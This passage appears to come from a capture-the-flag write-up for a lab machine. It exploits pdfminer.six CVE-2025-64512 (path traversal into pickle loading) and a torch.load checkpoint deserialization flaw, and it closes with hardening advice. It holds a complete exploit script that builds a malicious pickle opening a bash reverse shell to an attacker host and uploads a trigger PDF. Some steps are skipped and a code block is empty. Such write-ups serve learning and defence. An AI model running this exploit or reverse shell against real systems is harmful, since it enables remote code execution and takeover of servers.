## Step 2 - Initial Foothold

### pdfminer.six CMap Path Traversal & Pickle Deserialization (CVE-2025-64512)

Researching vulnerabilities in `pdfminer.six` leads to **CVE-2025-64512** (*CMapDB._load_data Insecure Deserialization via Absolute Path Traversal*).

#### Vulnerability Analysis:
To map character codes to font glyphs, PDF documents reference Character Maps (CMaps). To optimize text extraction performance, `pdfminer.six` pre-compiles standard CMaps into gzipped Python pickle files (`.pickle.gz`) located in its internal `cmap/` directory.

The vulnerability resides in `CMapDB._load_data()`:

```python
def _load_data(cls, name: str) -> Any:
    name = name.replace("\0", "")
    filename = "%s.pickle.gz" % name
    path = os.path.join(directory, filename)
    return type(str(name), (), pickle.loads(gzfile.read()))
```

> ⚠️ **Technical Detail:**  
> The `name` variable is extracted directly from the user-controlled PDF font `/Encoding` dictionary. In Python, `os.path.join(directory, filename)` exhibits a well-known quirk: **if `filename` begins with a leading forward slash (`/`), Python treats it as an absolute path and completely discards `directory`!**
> 
> As a result, if an attacker specifies an absolute path such as `/var/www/.../payload` in `/Encoding`, `pdfminer.six` appends `.pickle.gz` and directly calls `pickle.loads()` on that arbitrary file!

#### Discovering the Upload Directory:
To execute our serialized pickle file, we need its exact absolute server-side filesystem path. Let's upload a PDF referencing a non-existent path:

```text

endobj
```

Upon uploading, the server returns an informative error message:

The absolute destination directory is confirmed: **`/var/www/research.bedside.htb/uploads`**!

### Weaponizing CVE-2025-64512

We write an automated Python exploit script (`worked.py`):
1. `build_pickle()`: Instantiates an RCE object with a `__reduce__` method returning `(os.system, (cmd,))`, serializing it to `payload.pickle.gz`.
2. `encode_pdf_name()`: Hex-encodes special characters in the absolute path (`#2Fvar#2Fwww...`) to ensure valid PDF dictionary name syntax.
3. `build_pdf()`: Generates a minimal PDF embedding a Font with `/Encoding` pointing to our staged pickle file.
4. `upload()`: Transmits both `payload.pickle.gz` and `trigger.pdf` to the upload portal.

```python
import argparse
import gzip
import os
import pickle
import requests

def build_pickle(lhost, lport, out_path):
    class RCE:
        def __reduce__(self):
            cmd = f"bash -c 'bash -i >& /dev/tcp/{lhost}/{lport} 0>&1'"
            return (os.system, (cmd,))

    with gzip.open(out_path, "wb") as f:
        pickle.dump(RCE(), f)

def encode_pdf_name(path):
    out = ""
    for ch in path:
        if ch.isalnum() or ch in ".-_":
            out += ch
        else:
            out += "#%02X" % ord(ch)
    return out

def build_pdf(encoding_name):
    return f"""%PDF-1.4
1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj
2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj
3 0 obj<</Type/Page/Parent 2 0 R/MediaBox[0 0 612 792]/Contents 4 0 R/Resources<</Font<</F1 5 0 R>>>>>>endobj
4 0 obj<</Length 44>>stream
BT /F1 12 Tf 100 700 Td (x) Tj ET
endstream endobj
5 0 obj<</Type/Font/Subtype/Type0/BaseFont/F-Identity-H/Encoding/{encoding_name}/DescendantFonts[6 0 R]>>endobj
6 0 obj<</Type/Font/Subtype/CIDFontType2/BaseFont/F/CIDSystemInfo<</Registry(Adobe)/Ordering(Identity)/Supplement 0>>/FontDescriptor 7 0 R>>endobj
7 0 obj<</Type/FontDescriptor/FontName/F/Flags 4/FontBBox[-1000 -1000 1000 1000]/ItalicAngle 0/Ascent 1000/Descent -200/CapHeight 800/StemV 80>>endobj
xref
0 8
0000000000 65535 f
trailer<</Size 8/Root 1 0 R>>
startxref
0
%%EOF"""

def upload(target, filename, data):
    r = requests.post(target.rstrip("/") + "/", files={"uploadFile": (filename, data)}, timeout=15)
    return "uploaded successfully" in r.text, r

def main():
    ap = argparse.ArgumentParser(description="CVE-2025-64512 pdfminer.six pickle RCE PoC")
    ap.add_argument("-t", "--target-url", required=True)
    ap.add_argument("-H", "--lhost", required=True)
    ap.add_argument("-p", "--lport", required=True, type=int)
    ap.add_argument("--upload-path", default="/var/www/research.bedside.htb/uploads")
    ap.add_argument("--pickle-name", default="payload")
    args = ap.parse_args()

    pickle_file = f"{args.pickle_name}.pickle.gz"
    build_pickle(args.lhost, args.lport, pickle_file)
    print(f"[*] built {pickle_file}")

    ok, _ = upload(args.target_url, pickle_file, open(pickle_file, "rb"))
    if not ok:
        print("[-] pickle upload failed")
        return
    print(f"[+] uploaded {pickle_file}")

    cmap_target = f"{args.upload_path.rstrip('/')}/{args.pickle_name}"
    encoded_name = encode_pdf_name(cmap_target)
    pdf_data = build_pdf(encoded_name)

    ok, _ = upload(args.target_url, "trigger.pdf", pdf_data)
    if not ok:
        print("[-] pdf upload failed")
        return
    print("[+] uploaded trigger.pdf")
    print(f"[*] Waiting for backend processing...")

if __name__ == "__main__":
    main()
```

Let's inspect `/opt/trainer/bedside_trainer.py`:

```python
from monai.handlers import CheckpointLoader

DATASTORE_ROOT = Path("/datastore")
CHECKPOINT_DIR = DATASTORE_ROOT / "checkpoints"
PROCESSED_DIR = DATASTORE_ROOT / "processed"
STAGING_DIR = DATASTORE_ROOT / "staging"

def find_latest_checkpoint(checkpoint_dir: Path):
    ckpts = sorted(checkpoint_dir.glob("*.pt"), key=os.path.getmtime)
    return ckpts[-1] if ckpts else None

# Checkpoint loading:
latest_ckpt = find_latest_checkpoint(CHECKPOINT_DIR)
if latest_ckpt:
    logger.info(f"Found checkpoint {latest_ckpt}, loading with CheckpointLoader...")
    loader = CheckpointLoader(
        load_path=str(latest_ckpt),
        load_dict={"model": model, "optimizer": optimizer},
        map_location=DEVICE
    )
    loader(engine)
```

> ⚠️ **Technical Detail:**  
> MONAI's `CheckpointLoader` wraps PyTorch's `torch.load()`. Under the hood, `torch.load()` relies on Python's `pickle` module to deserialize `.pt` checkpoint files! When deserializing an object with a `__reduce__` method, it executes arbitrary code as root.

However, the script has a prerequisite check:

```python
dataloader, n_data = prepare_dataloader_from_processed(PROCESSED_DIR, BATCH_SIZE)
if n_data == 0:
    promoted = conservative_promote_from_staging(STAGING_DIR, PROCESSED_DIR, max_files=200)
    if not promoted:
        logger.warning("No data available to train. Exiting.")
        return
```

If `/datastore/processed/` and `/datastore/staging/` contain no data, the script exits immediately before reaching `CheckpointLoader`!

## Step 5 - Mitigations & Defensive Hardening

To remediate the vulnerabilities identified across the Bedside environment, administrators and data engineering teams should apply defense-in-depth controls across library dependencies, development environments, and machine learning pipelines:

### 1. Secure Character Map Handling in pdfminer.six (CVE-2025-64512)
- **Upgrade pdfminer.six:** Update `pdfminer.six` to a patched release where user-supplied CMap names are strictly validated against an internal whitelist and restricted from referencing external filesystem paths.
- **Strict Path Validation:** In custom document-processing wrappers, reject any font or encoding parameter containing path traversal sequences (`..`) or absolute path indicators (`/`, `\`).

### 2. Development Server & IPv6 Exposure Hardening
- **Bind Development Servers to Loopback Only:** Ensure internal development servers (such as Vite or esbuild) bind strictly to `127.0.0.1` and `::1` without exposing endpoints to wildcard interfaces (`0.0.0.0` or `::`).
- **Implement Production Static File Serving:** Never expose development servers with Hot Module Replacement (`/@hmr`) to production networks. Use hardened web servers (such as Nginx or Apache) with canonical path normalization enabled.

### 3. Safe PyTorch Checkpoint Loading (`weights_only=True`)
- **Enforce Safe Deserialization in PyTorch:** When invoking `torch.load()`, always specify `weights_only=True` to prevent the execution of arbitrary pickle constructors:
  ```python
  torch.load(checkpoint_path, weights_only=True)
  ```
- **Migrate to Safetensors:** Replace legacy `.pt` and `.pickle` serialization formats with `safetensors`, a modern format designed specifically for fast and secure tensor storage without code execution capabilities.

### 4. Least Privilege Sudo Policies
- **Avoid Wildcard Python Sudo Delegations:** Sudo entries granting root access to run Python scripts should be replaced with dedicated compiled binaries or restricted automation services.
- **Audit Shared Datastore Permissions:** Ensure training datastores (`/datastore/`) enforce strict POSIX permissions and ACLs, preventing unprivileged container accounts from staging files loaded by administrative processes.
